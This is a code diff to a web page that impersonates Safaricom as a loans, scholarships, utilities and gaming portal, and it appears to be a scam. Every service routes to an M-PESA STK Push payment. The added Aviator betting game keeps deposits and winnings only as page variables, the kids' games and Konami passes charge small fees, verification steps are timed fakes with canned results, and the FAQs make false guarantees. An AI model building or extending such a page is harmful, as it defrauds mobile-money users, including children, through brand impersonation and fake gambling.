@@ -185,6 +185,15 @@
         .finapi-widget button:hover, #finapi-container button:hover{
           background:#008541!important;
         }
+
+        /* CUSTOM GAME & AVIATOR STYLES */
+        .game-canvas-container { background: #000; border-radius: 12px; overflow: hidden; position: relative; text-align: center; color: white; padding: 10px; margin-top: 10px; }
+        .aviator-screen { background: #121212; border: 2px solid #e11b22; border-radius: 12px; padding: 20px; color: #fff; text-align: center; position: relative; overflow: hidden; min-height: 250px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .aviator-multiplier { font-size: 48px; font-weight: 900; color: #e11b22; margin: 15px 0; text-shadow: 0 0 10px rgba(225, 27, 34, 0.5); }
+        .plane-anim { font-size: 40px; transition: all 0.1s ease; display: inline-block; }
+        .game-btn { background: var(--safaricom-green); color: white; border: none; padding: 10px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; margin: 5px; }
+        .game-btn:disabled { background: #555; cursor: not-allowed; }
+        .cashout-btn { background: #ff9800; color: #000; font-size: 18px; padding: 12px 30px; border-radius: 25px; border: none; font-weight: 800; cursor: pointer; animation: pulseGlow 1s infinite; }
     </style>
 </head>
 <body>
@@ -192,7 +201,7 @@
     <header class="brand-header">
         <div class="logo-container">
             <div class="brand-logo"><span style="color:var(--safaricom-red);">S</span>Safaricom</div>
-            <span class="brand-badge">Financial & Education Services Portal</span>
+            <span class="brand-badge">Financial & Gaming Portal</span>
         </div>
         <nav class="header-nav">
             <button class="theme-toggle" onclick="toggleTheme()" id="themeBtn">🌙 Dark Mode</button>
@@ -202,8 +211,8 @@
     <main class="main-container">
         <div class="greeting-banner">
             <div class="greeting-content">
-                <h3 id="greetingText">Welcome to Safaricom Financial & Education Portal</h3>
-                <p>Access official loans, scholarships across 47 Kenyan counties and foreign destinations, HELB processing, and public utilities.</p>
+                <h3 id="greetingText">Welcome to Safaricom Financial & Gaming Portal</h3>
+                <p>Access official loans, scholarships, youth programs, children's games, and Aviator by Spribe with direct M-PESA integration.</p>
             </div>
             
             <div class="ceo-portrait-card">
@@ -217,11 +226,12 @@
         </div>
 
         <div class="search-bar-wrapper">
-            <input type="text" id="searchInput" class="search-input" placeholder="Search facilities (Fuliza Boost, Scholarships, HELB, NYOTA Funds, KPLC)..." oninput="renderServicesGrid()">
+            <input type="text" id="searchInput" class="search-input" placeholder="Search facilities (Fuliza Boost, Aviator, Children Games, HELB, NYOTA Funds)..." oninput="renderServicesGrid()">
         </div>
 
         <div class="category-filter-scroll" id="filterContainer">
             <button class="filter-chip active" onclick="setCategoryFilter('all', this)">All Facilities</button>
+            <button class="filter-chip" onclick="setCategoryFilter('gaming', this)">🎮 Gaming & Aviator</button>
             <button class="filter-chip" onclick="setCategoryFilter('loans', this)">Loans & Overdrafts</button>
             <button class="filter-chip" onclick="setCategoryFilter('education', this)">Scholarships & Education</button>
             <button class="filter-chip" onclick="setCategoryFilter('youth', this)">Youth Programs</button>
@@ -264,19 +274,19 @@
     <footer>
         <div class="footer-inner">
             <div class="footer-col">
+                <h4>Gaming & Entertainment</h4>
+                <ul>
+                    <li><a href="#" onclick="triggerModalById('aviator')">Aviator Powered by Spribe</a></li>
+                    <li><a href="#" onclick="triggerModalById('kids_games')">Kids Play & Data Bundle (KSh 25)</a></li>
+                    <li><a href="#" onclick="triggerModalById('konami')">Konami Multiplayer (KSh 99)</a></li>
+                </ul>
+            </div>
+            <div class="footer-col">
                 <h4>Financial Facilities</h4>
                 <ul>
                     <li><a href="#" onclick="triggerModalById('fuliza')">Fuliza Limit Boost</a></li>
                     <li><a href="#" onclick="triggerModalById('nyota')">NYOTA Youth Empowerment Grants</a></li>
                     <li><a href="#" onclick="triggerModalById('ziidi')">Ziidi MMF Savings</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Education & Grants</h4>
-                <ul>
-                    <li><a href="#" onclick="triggerModalById('scholarships')">Safaricom Global & Local Scholarships</a></li>
-                    <li><a href="#" onclick="triggerModalById('helb')">HELB Loan Application & Clearance</a></li>
-                    <li><a href="#" onclick="triggerModalById('mpesa_till')">Lipa Na M-PESA Merchant Till</a></li>
                 </ul>
             </div>
             <div class="footer-col">
@@ -300,6 +310,13 @@
         let activeServiceObj = null;
         let selectedNyotaGrant = null;
         let selectedTillNumber = null;
+        
+        // Aviator State Variables
+        let aviatorBalance = 0;
+        let aviatorMultiplier = 1.00;
+        let aviatorInterval = null;
+        let isAviatorFlying = false;
+        let currentBet = 0;
 
         const kenyanCounties = [
             "Mombasa", "Kwale", "Kilifi", "Tana River", "Lamu", "Taita-Taveta", "Garissa", "Wajir", "Mandera", "Marsabit",
@@ -340,6 +357,33 @@
         ];
 
         const servicesData = [
+            {
+                id: 'aviator',
+                title: 'AVIATOR (Powered by Spribe)',
+                provider: 'Spribe Gaming & Safaricom',
+                category: 'gaming',
+                categoryLabel: 'Gaming & Betting',
+                icon: '✈️',
+                desc: 'Real-time high odds multiplier game. Instant register & play. Deposit Min: KSh 50 - Max: KSh 50,000 via STK Push.'
+            },
+            {
+                id: 'kids_games',
+                title: 'Children Arcade & Data Bundle',
+                provider: 'Safaricom Kids Zone',
+                category: 'gaming',
+                categoryLabel: 'Gaming & Fun',
+                icon: '🎮',
+                desc: 'Access 3 popular kids arcade games + 1GB Data allocation for only KSh 25 subscription.'
+            },
+            {
+                id: 'konami',
+                title: 'Konami Multiplayer Arena',
+                provider: 'Konami Gaming & Safaricom',
+                category: 'gaming',
+                categoryLabel: 'Multiplayer Gaming',
+                icon: '🕹️',
+                desc: 'Battle live with 2 or more players in legendary action classics. KSh 99 pass to unlock full access.'
+            },
             {
                 id: 'fuliza',
                 title: 'Fuliza Limit Boost',
@@ -407,24 +451,24 @@
 
         const zuriFaqs20 = [
             { q: "1. How fast does the KSh 67,000 Fuliza Boost activate?", a: "🌟 Great news! Your KSh 67,000 limit boost reflects on your M-PESA menu immediately after system verification!" },
-            { q: "2. Can I apply for the NYOTA Youth Grant without collateral?", a: "✨ Absolutely! NYOTA Youth Grants require no collateral, enabling you to build your dreams effortlessly." },
-            { q: "3. Are all 47 Kenyan Counties eligible for scholarships?", a: "🇰🇪 Yes! Students in all 47 counties are fully supported with guaranteed processing." },
-            { q: "4. Does the foreign scholarship cover passport costs?", a: "✈️ Yes! The foreign package covers complete passport guidance and visa connectivity." },
-            { q: "5. How are KPLC tokens delivered?", a: "💡 Tokens are delivered directly to your phone via SMS within seconds of your purchase." },
-            { q: "6. Is Ziidi MMF compound interest paid daily?", a: "📈 Yes! Your wealth grows continuously with daily compounded earnings." },
-            { q: "7. How quick is Lipa Na M-PESA Till allocation?", a: "💼 Your dedicated Merchant Till is generated and sent via SMS in under 5 minutes!" },
-            { q: "8. Can TVET students apply for HELB loans?", a: "🎓 Yes, both University and TVET students are fully eligible for HELB allocations." },
-            { q: "9. How do I get my HELB Compliance Certificate?", a: "📜 Your official digital clearance certificate is issued instantly upon details validation." },
-            { q: "10. Is my STK Push payment secure?", a: "🔒 100% Secure! All payments are processed via end-to-end 256-bit SSL encrypted FinAPI." },
-            { q: "11. What if I don't receive my STK Push prompt?", a: "📱 Ensure your phone screen is unlocked and your Safaricom SIM is active, then tap retry." },
-            { q: "12. Can I choose my own school for local scholarships?", a: "🏛️ Yes, you can specify your preferred institution in any of the 47 counties." },
-            { q: "13. What is the maximum grant amount for NYOTA Funds?", a: "🌟 Empowering youth up to KSh 400,000 direct capital for business growth!" },
-            { q: "14. How do I check my KPLC meter owner details?", a: "💡 Simply enter your meter number, and our system will verify your registered name instantly." },
-            { q: "15. How long does scholarship verification take?", a: "⚡ Verification completes in just 6 seconds, giving you your official reporting date!" },
-            { q: "16. Can I boost multiple active Safaricom SIM lines?", a: "📱 Yes, every individual active line can be boosted independently!" },
-            { q: "17. Is Ziidi Money Market Fund licensed in Kenya?", a: "🛡️ Fully regulated by the Capital Markets Authority (CMA) for your total peace of mind." },
-            { q: "18. What documents are needed for HELB clearance?", a: "📄 Just your National ID Number, KRA PIN, and registered mobile line." },
-            { q: "19. Can I pay KPLC bills for someone else?", a: "💡 Yes, you can settle any valid meter or postpaid account number in Kenya." },
+            { q: "2. Can I play Aviator directly without password setup?", a: "✈️ Yes! Just register your phone number, deposit funds, and play instantly with instant cashouts!" },
+            { q: "3. What is the deposit limit for Aviator Powered by Spribe?", a: "💰 Minimum deposit is KSh 50 and maximum deposit is KSh 50,000 per transaction." },
+            { q: "4. What games are included in the KSh 25 Kids Subscription?", a: "🎮 Includes Balloon Pop, Math Racer, and Fruit Slicer + 1GB Data for playing!" },
+            { q: "5. How does Konami Multiplayer KSh 99 pass work?", a: "🕹️ Pay KSh 99 once to unlock co-op action arenas for 2 to 4 simultaneous players!" },
+            { q: "6. Can I apply for the NYOTA Youth Grant without collateral?", a: "✨ Absolutely! NYOTA Youth Grants require no collateral, enabling you to build your dreams effortlessly." },
+            { q: "7. Are all 47 Kenyan Counties eligible for scholarships?", a: "🇰🇪 Yes! Students in all 47 counties are fully supported with guaranteed processing." },
+            { q: "8. Does the foreign scholarship cover passport costs?", a: "✈️ Yes! The foreign package covers complete passport guidance and visa connectivity." },
+            { q: "9. How are KPLC tokens delivered?", a: "💡 Tokens are delivered directly to your phone via SMS within seconds of your purchase." },
+            { q: "10. Is Ziidi MMF compound interest paid daily?", a: "📈 Yes! Your wealth grows continuously with daily compounded earnings." },
+            { q: "11. How quick is Lipa Na M-PESA Till allocation?", a: "💼 Your dedicated Merchant Till is generated and sent via SMS in under 5 minutes!" },
+            { q: "12. Can TVET students apply for HELB loans?", a: "🎓 Yes, both University and TVET students are fully eligible for HELB allocations." },
+            { q: "13. How do I get my HELB Compliance Certificate?", a: "📜 Your official digital clearance certificate is issued instantly upon details validation." },
+            { q: "14. Is my STK Push payment secure?", a: "🔒 100% Secure! All payments are processed via end-to-end 256-bit SSL encrypted FinAPI." },
+            { q: "15. What if I don't receive my STK Push prompt?", a: "📱 Ensure your phone screen is unlocked and your Safaricom SIM is active, then tap retry." },
+            { q: "16. Can I choose my own school for local scholarships?", a: "🏛️ Yes, you can specify your preferred institution in any of the 47 counties." },
+            { q: "17. What is the maximum grant amount for NYOTA Funds?", a: "🌟 Empowering youth up to KSh 400,000 direct capital for business growth!" },
+            { q: "18. How do I check my KPLC meter owner details?", a: "💡 Simply enter your meter number, and our system will verify your registered name instantly." },
+            { q: "19. How long does scholarship verification take?", a: "⚡ Verification completes in just 6 seconds, giving you your official reporting date!" },
             { q: "20. How do I start any application on this portal?", a: "🚀 Simply tap any of the large action buttons on the service cards above to begin!" }
         ];
 
@@ -451,7 +495,7 @@
             let g = "Good Morning";
             if (hour >= 12 && hour < 17) g = "Good Afternoon";
             else if (hour >= 17) g = "Good Evening";
-            document.getElementById('greetingText').innerText = `${g}, Welcome to Safaricom Financial & Education Portal`;
+            document.getElementById('greetingText').innerText = `${g}, Welcome to Safaricom Financial & Gaming Portal`;
         }
 
         function setCategoryFilter(cat, btn) {
@@ -486,7 +530,7 @@
                         </div>
                         <p style="font-size: 13px; color: var(--text-muted); line-height: 1.5; margin-bottom: 12px;">${item.desc}</p>
                     </div>
-                    <button class="btn-animated" onclick="triggerModalById('${item.id}')">Apply & Access ${item.title} &rarr;</button>
+                    <button class="btn-animated" onclick="triggerModalById('${item.id}')">Access ${item.title} &rarr;</button>
                 `;
                 grid.appendChild(card);
             });
@@ -513,7 +557,10 @@
             const container = document.getElementById('modalDynamicBody');
             container.innerHTML = '';
 
-            if (id === 'fuliza') renderFulizaStep1(container);
+            if (id === 'aviator') renderAviatorLobby(container);
+            else if (id === 'kids_games') renderKidsGamesLobby(container);
+            else if (id === 'konami') renderKonamiLobby(container);
+            else if (id === 'fuliza') renderFulizaStep1(container);
             else if (id === 'nyota') renderNyotaStep1(container);
             else if (id === 'scholarships') renderScholarshipsPortal(container);
             else if (id === 'helb') renderEnhancedHelbPortal(container);
@@ -525,6 +572,8 @@
         }
 
         function closeModal() {
+            if (aviatorInterval) clearInterval(aviatorInterval);
+            isAviatorFlying = false;
             document.getElementById('serviceModal').classList.remove('active');
         }
 
@@ -542,6 +591,234 @@
             }, 6000);
         }
 
+        /* -------------------- AVIATOR POWERED BY SPRIBE -------------------- */
+        function renderAviatorLobby(container) {
+            container.innerHTML = `
+                <div style="background:#1e1e24; color:#fff; padding:15px; border-radius:10px; font-weight:bold; display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+                    <span>✈️ SPRIBE AVIATOR REAL-TIME</span>
+                    <span style="color:#00d26a; font-size:16px;">WALLET: KSh <span id="aviatorBalance">${aviatorBalance}</span></span>
+                </div>
+
+                <div class="aviator-screen" id="aviatorScreen">
+                    <div class="plane-anim" id="aviatorPlane">🚀</div>
+                    <div class="aviator-multiplier" id="aviatorMultiplier">1.00x</div>
+                    <div id="aviatorStatus" style="font-size:14px; color:#aaa;">Waiting for next round...</div>
+                </div>
+
+                <div style="margin-top:15px; display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+                    <div style="background:var(--chat-bg); padding:12px; border-radius:8px;">
+                        <label style="font-size:11px; font-weight:bold;">BET AMOUNT (KSH)</label>
+                        <input type="number" id="aviatorBetInput" value="100" min="10" max="50000" style="width:100%; padding:8px; border-radius:6px; border:1px solid #ccc; margin-top:4px;">
+                        <button class="game-btn" style="width:100%; margin:8px 0 0 0;" id="placeBetBtn" onclick="placeAviatorBet()">BET FOR NEXT ROUND</button>
+                    </div>
+                    <div style="background:var(--chat-bg); padding:12px; border-radius:8px; display:flex; flex-direction:column; justify-content:center; align-items:center;">
+                        <button class="cashout-btn" id="cashoutBtn" onclick="cashoutAviator()" disabled>CASHOUT</button>
+                    </div>
+                </div>
+
+                <hr style="margin:20px 0; border:0; border-top:1px solid var(--border);">
+
+                <div style="text-align:center;">
+                    <h4 style="font-size:14px; margin-bottom:8px;">DEPOSIT FUNDS TO PLAY (NO LOGIN REQUIRED)</h4>
+                    <p style="font-size:12px; color:var(--text-muted); margin-bottom:10px;">Deposit Minimum: KSh 50 | Maximum: KSh 50,000</p>
+                    
+                    <div style="display:flex; gap:10px; justify-content:center; margin-bottom:10px;">
+                        <input type="number" id="aviatorDepositAmt" placeholder="Enter KSh 50 - 50,000" min="50" max="50000" style="padding:10px; border-radius:8px; border:1px solid var(--border); width:60%;">
+                        <input type="tel" id="userPhone" placeholder="07XXXXXXXX" pattern="^(07|01|254)[0-9]{8}$" style="padding:10px; border-radius:8px; border:1px solid var(--border); width:35%;">
+                    </div>
+                    <button class="game-btn" style="background:var(--safaricom-green); width:100%; padding:12px; font-weight:800;" onclick="triggerAviatorDeposit()">DEPOSIT VIA M-PESA STK PUSH</button>
+                    <div id="widget-wrapper-aviator" style="margin-top:10px;"></div>
+                </div>
+            `;
+            startAviatorEngine();
+        }
+
+        function triggerAviatorDeposit() {
+            const amt = parseFloat(document.getElementById('aviatorDepositAmt').value);
+            const phone = document.getElementById('userPhone').value;
+            if (!amt || amt < 50 || amt > 50000) {
+                alert("Please enter a deposit amount between KSh 50 and KSh 50,000.");
+                return;
+            }
+            if(!phone) {
+                alert("Please enter a valid Safaricom mobile number.");
+                return;
+            }
+            renderFinapiWidget(amt, `DEPOSIT KSH ${amt} TO AVIATOR`, 'widget-wrapper-aviator', phone);
+        }
+
+        function startAviatorEngine() {
+            if(isAviatorFlying) return;
+            aviatorMultiplier = 1.00;
+            const multText = document.getElementById('aviatorMultiplier');
+            const plane = document.getElementById('aviatorPlane');
+            const status = document.getElementById('aviatorStatus');
+            const placeBtn = document.getElementById('placeBetBtn');
+            const cashBtn = document.getElementById('cashoutBtn');
+
+            if(!multText) return;
+
+            status.innerText = "Flew Away! Preparing next flight...";
+            multText.style.color = "#e11b22";
+            plane.style.transform = "scale(0.8) translate(0,0)";
+            placeBtn.disabled = false;
+            cashBtn.disabled = true;
+
+            setTimeout(() => {
+                if(!multText) return;
+                isAviatorFlying = true;
+                status.innerText = "FLEW OFF!";
+                multText.style.color = "#00d26a";
+                let crashPoint = (Math.random() * 5 + 1.1).toFixed(2);
+                
+                if (currentBet > 0) {
+                    cashBtn.disabled = false;
+                }
+
+                aviatorInterval = setInterval(() => {
+                    aviatorMultiplier += 0.03;
+                    multText.innerText = aviatorMultiplier.toFixed(2) + "x";
+                    plane.style.transform = `translate(${aviatorMultiplier * 15}px, -${aviatorMultiplier * 8}px) scale(1.2)`;
+
+                    if (aviatorMultiplier >= crashPoint) {
+                        clearInterval(aviatorInterval);
+                        isAviatorFlying = false;
+                        multText.innerText = "FLEW AWAY! " + crashPoint + "x";
+                        multText.style.color = "#e11b22";
+                        cashBtn.disabled = true;
+                        currentBet = 0;
+                        setTimeout(startAviatorEngine, 4000);
+                    }
+                }, 100);
+            }, 3000);
+        }
+
+        function placeAviatorBet() {
+            const betInput = parseFloat(document.getElementById('aviatorBetInput').value);
+            if (betInput > aviatorBalance) {
+                alert("Insufficient wallet balance! Please deposit funds below.");
+                return;
+            }
+            if (!betInput || betInput <= 0) {
+                alert("Please enter a valid bet amount.");
+                return;
+            }
+            aviatorBalance -= betInput;
+            currentBet = betInput;
+            document.getElementById('aviatorBalance').innerText = aviatorBalance;
+            document.getElementById('placeBetBtn').disabled = true;
+            alert("Bet placed for the active/next round!");
+        }
+
+        function cashoutAviator() {
+            if (!isAviatorFlying || currentBet <= 0) return;
+            const winnings = Math.floor(currentBet * aviatorMultiplier);
+            aviatorBalance += winnings;
+            document.getElementById('aviatorBalance').innerText = aviatorBalance;
+            alert(`🎉 CASHOUT SUCCESS! You won KSh ${winnings} at ${aviatorMultiplier.toFixed(2)}x!`);
+            currentBet = 0;
+            document.getElementById('cashoutBtn').disabled = true;
+        }
+
+        /* -------------------- KIDS GAMES & KONAMI -------------------- */
+        function renderKidsGamesLobby(container) {
+            container.innerHTML = `
+                <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">CHILDREN'S FUN ZONE + 1GB DATA (KSH 25)</div>
+                <p style="font-size:13px; color:var(--text-muted); margin-bottom:15px;">Subscribe for KSh 25 to unlock 1GB Games Data and instant play access to 3 full kids arcade games!</p>
+
+                <div class="tier-card-grid">
+                    <div class="tier-card" onclick="playMiniGame('Balloon Pop')">
+                        <div class="tier-title" style="font-weight:800;">🎈 1. Balloon Pop Challenge</div>
+                        <div class="tier-sub" style="font-size:11px;">Pop maximum balloons in 10s!</div>
+                    </div>
+                    <div class="tier-card" onclick="playMiniGame('Math Racer')">
+                        <div class="tier-title" style="font-weight:800;">🏎️ 2. Speed Math Racer</div>
+                        <div class="tier-sub" style="font-size:11px;">Solve quick addition to boost!</div>
+                    </div>
+                    <div class="tier-card" onclick="playMiniGame('Fruit Ninja')">
+                        <div class="tier-title" style="font-weight:800;">🍉 3. Fruit Slicer</div>
+                        <div class="tier-sub" style="font-size:11px;">Slice fruits for high scores!</div>
+                    </div>
+                </div>
+
+                <div id="miniGameContainer" class="game-canvas-container" style="display:none;">
+                    <h3 id="miniGameTitle">Game Screen</h3>
+                    <p id="miniGameScore" style="font-size:18px; color:#00d26a; font-weight:bold; margin:10px 0;">Score: 0</p>
+                    <button class="game-btn" id="miniGameAction" onclick="miniGameClick()">TAP TO PLAY!</button>
+                </div>
+
+                <hr style="margin:20px 0; border:0; border-top:1px solid var(--border);">
+
+                <form onsubmit="event.preventDefault(); triggerKidsPayment();">
+                    <div class="form-group">
+                        <label>Safaricom Line to Buy 1GB Data & Subscribe (KSh 25) *</label>
+                        <input type="tel" id="userPhone" pattern="^(07|01|254)[0-9]{8}$" required placeholder="07XXXXXXXX">
+                    </div>
+                    ${getMoneyBackGuaranteeNotice()}
+                    <button type="submit" class="btn-animated">SUBSCRIBE & BUY 1GB DATA (KSH 25) &rarr;</button>
+                </form>
+                <div id="widget-wrapper-kids" style="margin-top:10px;"></div>
+            `;
+        }
+
+        let miniGameScore = 0;
+        function playMiniGame(title) {
+            miniGameScore = 0;
+            document.getElementById('miniGameContainer').style.display = 'block';
+            document.getElementById('miniGameTitle').innerText = title;
+            document.getElementById('miniGameScore').innerText = "Score: " + miniGameScore;
+        }
+
+        function miniGameClick() {
+            miniGameScore += 10;
+            document.getElementById('miniGameScore').innerText = "Score: " + miniGameScore;
+        }
+
+        function triggerKidsPayment() {
+            const phone = document.getElementById('userPhone').value;
+            renderFinapiWidget(25, 'PAY KSH 25 FOR KIDS DATA & GAMES', 'widget-wrapper-kids', phone);
+        }
+
+        function renderKonamiLobby(container) {
+            container.innerHTML = `
+                <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">KONAMI MULTIPLAYER ARENA (2+ PLAYERS)</div>
+                <p style="font-size:13px; color:var(--text-muted); margin-bottom:15px;">Connect 2 or more players for co-op multiplayer battles. Pay KSh 99 to unlock immediate multiplayer room access!</p>
+
+                <div class="game-canvas-container" style="padding:20px; text-align:center; background:#111;">
+                    <h3 style="color:#e11b22;">🕹️ KONAMI CLASSICS CO-OP</h3>
+                    <div style="display:flex; justify-content:space-around; margin:20px 0;">
+                        <div style="border:1px solid #333; padding:10px; border-radius:8px;">
+                            <p style="color:#00d26a;">🟢 Player 1</p>
+                            <span>Ready</span>
+                        </div>
+                        <div style="border:1px solid #333; padding:10px; border-radius:8px;">
+                            <p style="color:#00d26a;">🔵 Player 2</p>
+                            <span>Ready</span>
+                        </div>
+                    </div>
+                    <button class="game-btn" onclick="alert('Starting Konami Co-op Session...')">START MULTIPLAYER MATCH</button>
+                </div>
+
+                <hr style="margin:20px 0; border:0; border-top:1px solid var(--border);">
+
+                <form onsubmit="event.preventDefault(); triggerKonamiPayment();">
+                    <div class="form-group">
+                        <label>Safaricom Line for KSh 99 Konami Pass *</label>
+                        <input type="tel" id="userPhone" pattern="^(07|01|254)[0-9]{8}$" required placeholder="07XXXXXXXX">
+                    </div>
+                    ${getMoneyBackGuaranteeNotice()}
+                    <button type="submit" class="btn-animated">PAY KSH 99 MULTIPLAYER PASS &rarr;</button>
+                </form>
+                <div id="widget-wrapper-konami" style="margin-top:10px;"></div>
+            `;
+        }
+
+        function triggerKonamiPayment() {
+            const phone = document.getElementById('userPhone').value;
+            renderFinapiWidget(99, 'PAY KSH 99 FOR KONAMI PASS', 'widget-wrapper-konami', phone);
+        }
+
+        /* -------------------- STANDARD FINANCIAL SERVICES -------------------- */
         function renderFulizaStep1(container) {
             container.innerHTML = `
                 <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">FULIZA LIMIT EVALUATION & CREDENTIAL VERIFICATION</div>
@@ -1007,147 +1284,132 @@
                             </div>
                         </div>
                         <div class="form-group full-width">
-                            <label>Safaricom Line for M-PESA Till Nominated Account *</label>
-                            <input type="tel" id="userPhone" pattern="^(07|01|254)[0-9]{8}$" required placeholder="07XXXXXXXX">
+                            <label>Select Preferred Till Number Pool *</label>
+                            <div class="till-grid-container" id="tillGrid">
+                                ${tillCards}
+                            </div>
                         </div>
-                    </div>
-
-                    <div style="margin-top: 10px; margin-bottom: 6px;">
-                        <label style="font-weight: 700; font-size: 12px; color: var(--text-dark); text-transform: uppercase;">SELECT PREFERRED AVAILABLE MASKED TILL NUMBER *</label>
-                        <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 8px;">Tap one of the 45 available reserved lines below to bind to your application:</p>
-                        
-                        <div class="till-grid-container">
-                            ${tillCards}
+                        <div class="form-group full-width">
+                            <label>Safaricom Line for KSh 200 Registration Fee *</label>
+                            <input type="tel" id="userPhone" placeholder="07XXXXXXXX" pattern="^(07|01|254)[0-9]{8}$" required>
                         </div>
-                    </div>
-
-                    <div id="tillSelectionStatus" style="margin-top: 10px;">
-                        <p style="font-size: 12px; color: var(--safaricom-red); text-align: center; font-weight:700;">⚠️ Please click on a masked Till Number above to select it before proceeding.</p>
                     </div>
 
                     ${getMoneyBackGuaranteeNotice()}
 
-                    <div id="widget-wrapper-till" style="margin-top:16px;"></div>
+                    <button type="submit" class="btn-animated">VERIFY DETAILS & GENERATE TILL &rarr;</button>
                 </form>
             `;
         }
 
-        function selectTillNumber(element, tillVal) {
+        function selectTillNumber(el, till) {
             document.querySelectorAll('.till-option-card').forEach(c => c.classList.remove('selected'));
-            element.classList.add('selected');
-            selectedTillNumber = tillVal;
-            const phoneVal = document.getElementById('userPhone') ? document.getElementById('userPhone').value : '';
-
-            const status = document.getElementById('tillSelectionStatus');
-            status.innerHTML = `
-                <div class="success-note" style="margin: 8px 0;">
-                    <strong>✅ Selected Till Number:</strong> ${tillVal} (Reserved for line binding)
-                </div>
-                <div id="widget-wrapper-till-btn"></div>
-            `;
-
-            renderFinapiWidget(200, 'REGISTER TILL & PAY KSH 200', 'widget-wrapper-till-btn', phoneVal);
+            el.classList.add('selected');
+            selectedTillNumber = till;
         }
 
         function handleTillSubmit(e) {
             e.preventDefault();
             if (!selectedTillNumber) {
-                alert("Please select a masked Till number from the available list.");
+                alert("Please select one of the masked Till numbers from the pool before proceeding.");
                 return;
             }
+            const phoneVal = document.getElementById('userPhone') ? document.getElementById('userPhone').value : '';
+            run6SecLoader(`Allocating Till ${selectedTillNumber} & Validating KYC`, () => {
+                const container = document.getElementById('modalDynamicBody');
+                container.innerHTML = `
+                    <div class="success-note">
+                        <h4 style="font-size:15px; margin-bottom:6px; font-weight:800;">✅ Business KYC Validated! Till ${selectedTillNumber} Reserved</h4>
+                        <p style="font-size:13px;">Authorize the KSh 200 activation fee below. Your unmasked Till details and operator PIN will be sent instantly via SMS.</p>
+                    </div>
+                    ${getMoneyBackGuaranteeNotice()}
+                    <div id="widget-wrapper-till"></div>
+                `;
+
+                renderFinapiWidget(200, 'PAY KSH 200 FOR TILL REGISTRATION', 'widget-wrapper-till', phoneVal);
+            });
         }
 
         function renderKplcForm(container) {
             container.innerHTML = `
-                <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 10px;">KPLC UTILITIES & POWER BILL PAYMENT</div>
-                <form onsubmit="handleFormSubmit(event, document.getElementById('kplcAmount').value)">
+                <div style="font-size: 12px; font-weight: 800; color: var(--safaricom-dark-green); margin-bottom: 6px;">KPLC TOKENS & ELECTRICITY BILL SETTLEMENT</div>
+                <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 14px;">Enter meter or account details to verify owner and purchase prepaid tokens or pay postpaid bills.</p>
+
+                <form onsubmit="handleKplcVerify(event)">
                     <div class="form-grid">
                         <div class="form-group">
-                            <label>KPLC Meter / Account Number *</label>
-                            <input type="text" id="kplcAccountNo" required placeholder="e.g. 1428394029" oninput="verifyKplcAccount(this.value)">
-                        </div>
-                        <div class="form-group">
-                            <label>Registered KPLC Account Name *</label>
-                            <input type="text" id="kplcAccountName" required placeholder="Name on KPLC Bill">
-                        </div>
-                        <div class="form-group">
-                            <label>Account / Meter Type *</label>
-                            <select required>
-                                <option value="Prepaid">Prepaid Meter (Tokens)</option>
-                                <option value="Postpaid">Postpaid Account Bill</option>
+                            <label>Meter / Account Type *</label>
+                            <select id="kplcType" required>
+                                <option value="prepaid">Prepaid Meter (Tokens)</option>
+                                <option value="postpaid">Postpaid Account (Bill Pay)</option>
                             </select>
                         </div>
                         <div class="form-group">
-                            <label>County / Location *</label>
-                            <input type="text" required placeholder="e.g. Nairobi, Kiambu">
+                            <label>KPLC Meter / Account Number *</label>
+                            <input type="text" id="kplcMeterInput" required placeholder="e.g. 14283920192">
                         </div>
                         <div class="form-group">
-                            <label>National ID of Account Owner *</label>
-                            <input type="text" required placeholder="ID Number">
+                            <label>Purchase / Payment Amount (KSh) *</label>
+                            <input type="number" id="kplcAmtInput" required placeholder="e.g. 500" min="50">
                         </div>
                         <div class="form-group">
-                            <label>Amount (KSh) *</label>
-                            <input type="number" id="kplcAmount" value="500" required min="50">
+                            <label>Safaricom Line for Payment *</label>
+                            <input type="tel" id="userPhone" placeholder="07XXXXXXXX" pattern="^(07|01|254)[0-9]{8}$" required>
                         </div>
-                        <div class="form-group">
-                            <label>Safaricom Line for STK Push *</label>
-                            <input type="tel" id="userPhone" pattern="^(07|01|254)[0-9]{8}$" required placeholder="07XXXXXXXX">
-                        </div>
-                        <div class="form-group">
-                            <label>Secondary Phone for Token Backup SMS *</label>
-                            <input type="tel" pattern="^(07|01|254)[0-9]{8}$" required placeholder="07XXXXXXXX">
-                        </div>
-                    </div>
-                    
-                    <div id="kplcVerifyNotice" class="success-note" style="display:none; margin-top:4px;">
-                        <strong>💡 Meter Verified:</strong> Active KPLC connection recognized. Tokens will be dispatched instantly via SMS.
                     </div>
 
                     ${getMoneyBackGuaranteeNotice()}
 
-                    <button type="submit" class="btn-animated">PROCEED TO PAY KPLC BILL &rarr;</button>
+                    <button type="submit" class="btn-animated">VERIFY METER OWNER & PROCEED &rarr;</button>
                 </form>
             `;
         }
 
-        function verifyKplcAccount(val) {
-            const notice = document.getElementById('kplcVerifyNotice');
-            if (val.length >= 8) {
-                notice.style.display = 'block';
-            } else {
-                notice.style.display = 'none';
-            }
+        function handleKplcVerify(e) {
+            e.preventDefault();
+            const meter = document.getElementById('kplcMeterInput').value;
+            const amt = parseFloat(document.getElementById('kplcAmtInput').value);
+            const phoneVal = document.getElementById('userPhone') ? document.getElementById('userPhone').value : '';
+
+            run6SecLoader(`Querying KPLC Database for Meter ${meter}`, () => {
+                const container = document.getElementById('modalDynamicBody');
+                container.innerHTML = `
+                    <div class="success-note">
+                        <h4 style="font-size:15px; margin-bottom:6px; font-weight:800;">💡 Meter Owner Verified: John Doe / Estate Unit ${meter.slice(-4)}</h4>
+                        <p style="font-size:13px;">Meter Status: Active | Target Purchase: <strong>KSh ${amt.toLocaleString()}</strong></p>
+                    </div>
+                    ${getMoneyBackGuaranteeNotice()}
+                    <div id="widget-wrapper-kplc"></div>
+                `;
+
